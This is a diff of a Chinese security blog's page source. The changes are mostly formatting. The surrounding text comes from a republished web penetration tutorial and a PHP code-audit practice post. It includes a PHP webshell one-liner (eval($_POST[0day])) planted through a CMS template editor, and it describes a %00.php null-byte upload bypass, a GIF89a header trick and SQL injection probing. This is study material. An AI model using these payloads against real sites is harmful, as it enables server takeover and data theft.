@@ -10,9 +10,10 @@
 <p>无意中发现的 treasure <strong>:) </strong>，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-
-
+<p><br></p>
 <p><strong>本文所有文章均转载自：<a href="http://www.yuntest.org/" target="_blank" rel="noopener">http://www.yuntest.org/</a> 如有侵权，请联系。</strong></p>
+<hr>
+<p><br></p>
 <h1 id="前言-揭开Web渗透与安全的面纱（必看）"><a href="#前言-揭开Web渗透与安全的面纱（必看）" class="headerlink" title="前言-揭开Web渗透与安全的面纱（必看）"></a>前言-揭开Web渗透与安全的面纱（必看）</h1><h2 id="服务器是怎么被入侵的"><a href="#服务器是怎么被入侵的" class="headerlink" title="服务器是怎么被入侵的"></a>服务器是怎么被入侵的</h2><p>攻击者想要对一台计算机<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>必须具备以下条件：</p>
 <p>1、服务器与客户端能够正常通讯</p>
 <p>（服务器是为客户端提供服务的）</p>
@@ -975,7 +976,7 @@
 <p>关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码</p>
 <p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[0day])’.”rnrn?”.”&gt;rn”);</p>
 <p>点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day</p>
-</the></excerpt>]]></content>
+<center><strong>·End·</strong></center></the></excerpt>]]></content>
       
         <categories>
             
@@ -1005,9 +1006,9 @@
 <p>开始涉足代码审计，了解了一些敏感函数之后，是时候拿点实例来练练手了！<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-
-
+<p><br></p>
 <p>把握大局（分析网站结构）-&gt;  通读全文法/敏感函数参数回溯法/定向功能分析法  -&gt; </p>
+<p><br></p>
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><p>用sexy法师的审计系统扫一扫，发现存在四个地方存在文件上传（move_uploaded_file 函数）</p>
 <p>1.admin_pic.php</p>
 <blockquote>
@@ -1032,7 +1033,7 @@
 <p>经过上述php的审计，得出他是用白名单策略来检查扩展名，所以就试了下 <strong>nginx空子节漏洞</strong>，用burp在.jpg后加上<strong>%00.php </strong>后发现上传的jpg文件已经被解析为php了。所以…. <strong>:)</strong> </p>
 <p>难道只存在解析漏洞？再找找看～～</p>
 <p>但是我又在之前已嵌入php代码的png文件中尝试用%00.php 来执行png中的代码，发现不得行：<img src="https://ws3.sinaimg.cn/large/006tNc79gy1fmt9e5nmcxj313e0eeaam.jpg" width="50%"></p>
-<p>初步分析是过滤了<strong>%</strong>，<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmu79c9wx2j30ae01eq2s.jpg" width="40%">但是直接在url上加%后enter，发现，没有被转义啊！<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmu7a6tic6j308y01a3yc.jpg" width="40%"></p>
+<p>初步分析是过滤了<strong>%</strong>，<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmu79c9wx2j30ae01eq2s.jpg" width="30%">但是直接在url上加%后enter，发现，没有被转义啊！<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmu7a6tic6j308y01a3yc.jpg" width="30%"></p>
 <p><strong>But Why？</strong></p>
 <h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>验证文件头只要为GIF89a，就会返回真</p>
 <p>1.admin_pic.php</p>
@@ -1096,7 +1097,7 @@
 <p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmww1nf2i1j315q01at8m.jpg" width="50%">登陆的时候随便测试了一下万能密码，发现 <strong>‘</strong> 被 <strong>\’</strong> 转义了，<strong>=</strong> 也被过滤了。</p>
 <p>但是在burp上稍微改改参数，但是会显示密码不正确，好像还没看懂如何验证登录。</p>
 <p>首页的搜索框是不是也可以看看有没有注入的点？</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmwwlehuvej308m01adfo.jpg" width="40%">好像一有query语句，就会有x和y……</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmwwlehuvej308m01adfo.jpg" width="30%">好像一有query语句，就会有x和y……</p>
 <p>然后sql语句执行了有上90条～估计是遍历各个地方看看有没有所需的东西。</p>
 <h2 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码/命令执行"></a>代码/命令执行</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>1.mail.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;SingleToArray <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!@$mail = popen($sendmail, <span class="string">'w'</span>)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;Lang(<span class="string">'execute'</span>) . <span class="keyword">$this</span>-&gt;Sendmail, <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">        &#125;</span><br><span class="line">        fputs($mail, <span class="string">"To: "</span> . $val . <span class="string">"\n"</span>);</span><br><span class="line">        fputs($mail, $header);</span><br><span class="line">        fputs($mail, $body);</span><br><span class="line">        $result = pclose($mail);</span><br></pre></td></tr></table></figure>
